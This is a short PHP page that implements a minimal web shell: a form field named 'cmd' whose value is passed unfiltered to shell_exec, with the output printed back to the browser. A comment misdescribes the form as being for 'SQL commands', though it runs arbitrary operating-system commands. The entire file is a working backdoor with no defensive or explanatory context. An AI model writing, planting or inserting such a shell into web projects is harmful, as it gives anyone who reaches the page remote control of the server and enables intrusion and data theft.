<html>
  <?php
    if(isset($_POST['submit']))
    {
      //Fetch the command
      $command = $_POST['cmd'];

      //Issue the command
      echo "Command: $command\n";
      $result = shell_exec("$command");

      //Print results
      print "<br><pre>";
      print_r($result);
      print "</pre>";
    }
  ?>

  <body>
    <!-- Simple form for inputting SQL commands !-->
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
      Command: <input type="text" name="cmd"><br>
      <input type="submit" name="submit" value="Submit">
    </form>
  </body>
</html>